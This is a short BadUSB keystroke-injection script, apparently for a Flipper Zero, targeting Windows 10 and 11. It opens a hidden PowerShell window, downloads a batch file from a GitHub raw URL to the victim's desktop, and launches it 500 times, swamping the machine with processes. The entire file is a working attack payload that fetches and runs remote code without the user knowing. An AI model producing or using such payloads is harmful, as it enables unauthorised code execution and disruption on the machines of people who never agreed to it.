REM Target OS: Windows 10 & 11

DELAY 1000
GUI r
DELAY 600
STRING powershell -NoP -NonI -W Hidden
ENTER
DELAY 1200
STRING $dp=[Environment]::GetFolderPath("Desktop"); $f="$dp\cmd.bat"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KneBellx/flipper-zero-badusb/main/utils/files/startcmd.bat" -OutFile $f -UseBasicParsing; 1..500 | % { Start-Process $f -ErrorAction SilentlyContinue }
ENTER
